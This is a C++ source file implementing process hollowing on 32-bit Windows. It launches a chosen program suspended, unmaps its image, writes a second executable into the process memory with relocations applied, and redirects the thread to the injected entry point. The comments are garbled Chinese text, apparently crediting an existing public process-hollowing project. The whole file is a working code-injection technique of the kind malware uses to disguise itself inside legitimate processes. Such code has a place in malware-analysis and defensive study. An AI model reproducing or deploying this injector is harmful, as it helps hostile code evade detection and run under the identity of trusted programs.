/**************************
��(chao)д(xi)��2018-09-19��
��Ϯ��m0n0ph1/Process-Hollowing
����Inject�Ľ��̱�����GUI����
***************************/

#include <Windows.h>
#include <iostream>

using namespace std;

typedef struct _BASE_PROCESS_INFO
{
	ULONG BaseAddress;
	CONTEXT ThreadContext;
	PROCESS_INFORMATION ProcessInfo;
}BASE_PROCESS_INFO, *PBASE_PROCESS_INFO;

typedef ULONG(WINAPI *NTUNMAPVIEWOFSECTION)(
	__in HANDLE ProcessHandle,
	__in PVOID BaseAddress
	);

LONG TurnRvaIntoRaw(PIMAGE_NT_HEADERS temp, LONG Rva)
{
	INT NumbersOfSections = temp->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER SectionHeader = IMAGE_FIRST_SECTION(temp);
	for (int i = 0; i < NumbersOfSections; ++i)
	{
		DWORD StartAddress = SectionHeader->VirtualAddress;
		DWORD EndAddress = StartAddress + SectionHeader->Misc.VirtualSize;
		if (Rva >= StartAddress && Rva <= EndAddress)
		{
			//cout << Rva - StartAddress + SectionHeader->PointerToRawData << endl;
			return Rva - StartAddress + SectionHeader->PointerToRawData;
		}
		++SectionHeader;
	}
	return 0;
}

BOOL CreateInjectProcess(CHAR *ProcessImageName, PBASE_PROCESS_INFO BaseProcessInfo)
{
	STARTUPINFOA StartInfo;
	ZeroMemory(&StartInfo, sizeof(StartInfo));
	StartInfo.cb = sizeof(StartInfo);

	if (CreateProcessA(NULL, ProcessImageName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartInfo, &BaseProcessInfo->ProcessInfo))
	{
		BaseProcessInfo->ThreadContext.ContextFlags = CONTEXT_FULL;
		GetThreadContext(BaseProcessInfo->ProcessInfo.hThread, &BaseProcessInfo->ThreadContext);

		ULONG Peb = BaseProcessInfo->ThreadContext.Ebx;					//���Բ鿴CreateProcess����������Context��EBX�����ʵ���Ͼ���PEB
		ULONG RetSize = 0;
		ReadProcessMemory(BaseProcessInfo->ProcessInfo.hProcess, (PVOID)(Peb + 8), &BaseProcessInfo->BaseAddress, 4, &RetSize);

		return TRUE;
	}

	return FALSE;
}

CHAR* GetProcessBuffer(CHAR *ProcessFilePath)
{
	HANDLE FileHandle = CreateFileA(
		ProcessFilePath,
		GENERIC_READ,
		0,
		0,
		OPEN_ALWAYS,
		0,
		0
		);

	if (FileHandle == NULL)
	{
		cout << "���ļ� " << ProcessFilePath << "ʧ�ܣ��������ǣ�" << GetLastError() << endl;
		return NULL;
	}

	ULONG FileSize;
	FileSize = GetFileSize(FileHandle, NULL);

	CHAR *FileBuffer = new CHAR[FileSize];
	if (FileBuffer == NULL)
	{
		cout << "�����ڴ�ʧ�ܣ�" << endl;
		CloseHandle(FileHandle);
		return NULL;
	}

	ULONG ReadBytes = 0;
	if (!ReadFile(FileHandle, FileBuffer, FileSize, &ReadBytes, NULL) || ReadBytes != FileSize)
	{
		cout << "��ȡ�ļ�ʧ�ܣ��������ǣ�" << GetLastError() << endl;
		CloseHandle(FileHandle);
		return NULL;
	}

	return FileBuffer;
}

int main()
{
	HANDLE hMutex = CreateMutexA(NULL, FALSE, "TY_MUTEX");
	if (GetLastError() == ERROR_ALREADY_EXISTS)			//�����ǰ�����Ѿ�������ô����к����˳�
	{
		MessageBoxA(GetDesktopWindow(), "Hello Father��", "", MB_OK);
		return 0;
	}

	BASE_PROCESS_INFO BaseProcessInfo;
	ZeroMemory(&BaseProcessInfo, sizeof(BaseProcessInfo));
	//CreateInjectProcess("C:\\Windows\\system32\\calc.exe", &BaseProcessInfo);
	CHAR FilePath[MAX_PATH];
	cin.getline(FilePath, MAX_PATH);

	do
	{
		CreateInjectProcess(FilePath, &BaseProcessInfo);
		if (BaseProcessInfo.BaseAddress == 0)
		{
			cout << "��������ʧ�ܣ�" << endl;
			break;
		}

		NTUNMAPVIEWOFSECTION NtUnmapViewofSection = NULL;
		NtUnmapViewofSection = (NTUNMAPVIEWOFSECTION)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");

		if (NtUnmapViewofSection == NULL)
		{
			cout << "��ȡNtUnmapViewofSection����ʧ�ܣ�" << endl;
			break;
		}

		NtUnmapViewofSection(BaseProcessInfo.ProcessInfo.hProcess, (PVOID)BaseProcessInfo.BaseAddress);
		cin.getline(FilePath, MAX_PATH);
		CHAR* ProcessBuffer = GetProcessBuffer(FilePath);
		PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)ProcessBuffer;
		if (DosHeader == NULL)
		{
			cout << "��ȡ�����ļ�����ʧ�ܣ�" << endl;
			break;
		}

		PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)((ULONG)DosHeader + DosHeader->e_lfanew);

		//��ʵ�������͵����ֱ����ntheader�ڲ��ƶ���ImageBase�����ڴ棬�Ͳ���Ҫ�ض�λ��
		LPVOID NewModuleBase = VirtualAllocEx(BaseProcessInfo.ProcessInfo.hProcess, (PVOID)BaseProcessInfo.BaseAddress, NtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (NewModuleBase == NULL)
		{
			cout << "�����ڴ�ʧ�ܣ��������ǣ�" << GetLastError() << endl;
			break;
		}

		//���ﱣ����֮ǰ��NtHeader��ImageBaseȻ���޸�һ����������д���ȥ
		ULONG OldImageBase = NtHeader->OptionalHeader.ImageBase;
		NtHeader->OptionalHeader.ImageBase = (ULONG)NewModuleBase;

		BOOL WriteMemoryFlag = 0;
		WriteMemoryFlag = WriteProcessMemory(BaseProcessInfo.ProcessInfo.hProcess, NewModuleBase, (PVOID)ProcessBuffer, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
		if (WriteMemoryFlag == 0)
		{
			cout << "д��ӳ��ͷʧ�ܣ��������ǣ�" << GetLastError() << endl;
			break;
		}

		IMAGE_SECTION_HEADER * SectionHeader = IMAGE_FIRST_SECTION(NtHeader);
		for (int i = 0; i < NtHeader->FileHeader.NumberOfSections; ++i, ++SectionHeader)
		{
			WriteMemoryFlag = WriteProcessMemory(BaseProcessInfo.ProcessInfo.hProcess, (PVOID)((ULONG)NewModuleBase + SectionHeader->VirtualAddress), (PVOID)(ProcessBuffer + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, NULL);
			if (WriteMemoryFlag == 0)
			{
				cout << "д������" << SectionHeader->Name << "ʧ�ܣ��������ǣ�" << GetLastError() << endl;
				break;
			}
		}
		if (WriteMemoryFlag == 0)
			break;

		//����һ���Ƿ���Ҫ�����ض�λ���㣬�õ�ǰģ���ַ��ȥNtHeader��Ҫ���ģ���ַ
		ULONG RelctOffset = (ULONG)NewModuleBase - OldImageBase;
		if (RelctOffset)
		{
			//��Ȼ��������InjectedProcess��NtHeader->OptionalHeader.ImageBase��λ�÷����ڴ�
			//�����Ͳ���Ҫ�����ض�λ��
			//����ʵ���ϲ�����ÿ�ζ������Ǹ�λ�÷���ɹ�
			//��������ض�λ�Ĳ�������Ҫд
			cout << "��Ҫ�����ض�λ��" << endl;

			if (NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0)
			{
				IMAGE_BASE_RELOCATION *RelocationImage = (IMAGE_BASE_RELOCATION *)(ProcessBuffer + TurnRvaIntoRaw(NtHeader, NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress));

				for (; RelocationImage->VirtualAddress != 0;)
				{
					/*�������Ϊʲôд
					#define CountRelocationEntries(dwBlockSize)		\
					(dwBlockSize -								\
					sizeof(BASE_RELOCATION_BLOCK)) /			\
					sizeof(BASE_RELOCATION_ENTRY)
					�Ͳ鿴���*/
					ULONG NumberOfBlocks = (RelocationImage->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;

					USHORT * Block = (USHORT *)((CHAR*)RelocationImage + sizeof(IMAGE_BASE_RELOCATION));
					for (ULONG i = 0; i < NumberOfBlocks; ++i, Block++)
					{
						USHORT addr = *Block & 0x0fff;											//�õ�12λ��Ϊ��־��
						USHORT sign = *Block >> 12;												//����λ��Ϊ��־������
						if (sign == 3)
						{
							ULONG AddressOffset = RelocationImage->VirtualAddress + addr;				//Block�ǵ�ǰҳ���ڲ��ı��˵�ַ�����Լ��ϵ�ǰҳ���λ�ü�����ƫ�Ƶ�ַ��

							ULONG OldValue = 0;
							ReadProcessMemory(BaseProcessInfo .ProcessInfo.hProcess, (PVOID)((ULONG)NewModuleBase + AddressOffset), &OldValue, 4, NULL);
							OldValue += RelctOffset;
							WriteProcessMemory(BaseProcessInfo.ProcessInfo.hProcess, (PVOID)((ULONG)NewModuleBase + AddressOffset), &OldValue, 4, NULL);
						}
						else if (sign == 0)
						{
							//signΪ0��ģ�������Ϊ�˶����ڴ档
						}
					}
					RelocationImage = (IMAGE_BASE_RELOCATION *)((char*)RelocationImage + RelocationImage->SizeOfBlock);
				}
			}

		}

		WriteProcessMemory(BaseProcessInfo.ProcessInfo.hProcess, (PVOID)(BaseProcessInfo.ThreadContext.Ebx + 8), &NewModuleBase, 4, NULL);

		BaseProcessInfo.ThreadContext.Eax = (ULONG)NewModuleBase + NtHeader->OptionalHeader.AddressOfEntryPoint;
		BaseProcessInfo.ThreadContext.ContextFlags = CONTEXT_FULL;
		SetThreadContext(BaseProcessInfo.ProcessInfo.hThread, &BaseProcessInfo.ThreadContext);
		ResumeThread(BaseProcessInfo.ProcessInfo.hThread);

	} while (FALSE);

	system("pause");
	return 0;
}